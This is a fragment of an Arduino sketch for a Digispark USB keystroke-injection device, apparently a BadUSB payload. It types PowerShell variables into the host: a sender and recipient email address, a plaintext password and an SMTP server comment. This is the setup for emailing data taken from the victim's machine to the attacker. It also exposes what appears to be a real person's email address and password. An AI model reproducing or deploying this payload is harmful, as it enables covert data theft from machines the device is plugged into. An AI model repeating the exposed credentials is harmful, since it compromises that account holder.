...
// User variables start
  ...
  //from email address:
  DigiKeyboard.print(F("$email = \"matheusfontanettimartins@gmail.com\";"));
  //to email address
  DigiKeyboard.print(F("$addressee = \"matheusfontanettimartins@gmail.com\";"));
  ...
  DigiKeyboard.print(F("$pass = \"M@atheus199898\";"));
  //smtp server
